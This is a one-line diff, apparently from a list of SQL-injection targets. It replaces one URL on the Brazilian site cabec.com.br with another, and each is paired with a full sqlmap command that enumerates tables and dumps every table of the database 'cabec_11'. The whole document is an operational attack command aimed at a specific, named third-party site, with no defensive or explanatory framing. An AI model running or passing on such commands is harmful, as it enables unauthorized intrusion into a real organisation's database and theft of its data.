@@ -1,1 +1,1 @@
-http://www.cabec.com.br/destaques_interna.php?destaque=38 (GET)  # sqlmap.py -u http://www.cabec.com.br/destaques_interna.php?destaque=38 --dbs -D cabec_11 --dump-all --threads 50 -v3
+http://www.cabec.com.br/noticias_interna.php?noticias=239 (GET)  # sqlmap.py -u http://www.cabec.com.br/noticias_interna.php?noticias=239 -D cabec_11 --tables --threads 5 -v3 --dump-all
